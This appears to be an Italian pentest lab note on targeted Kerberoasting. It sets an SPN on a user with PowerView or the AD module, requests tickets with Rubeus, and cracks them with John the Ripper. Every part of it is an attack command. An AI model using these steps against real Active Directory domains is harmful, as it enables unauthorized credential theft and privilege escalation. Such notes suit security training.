# Priv Esc - Kerberoasting - Set SPN2

#### Imposta un SPN per l'utente (deve essere unico nella foresta l'SPN)

* PowerView

```powershell
Set-DomainObject -Identity <UTENTE> -Set @{serviceprincipalname=‘dcorp/whatever1'}
```

* Active Directory Module

```powershell
Set-ADUser -Identity support1user -ServicePrincipalNames @{Add=‘dcorp/whatever1'}
```

#### Kerberoastare l'utente

```powershell
Rubeus.exe kerberoast /outfile:targetedhashes.txt
```

```powershell
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt 
```
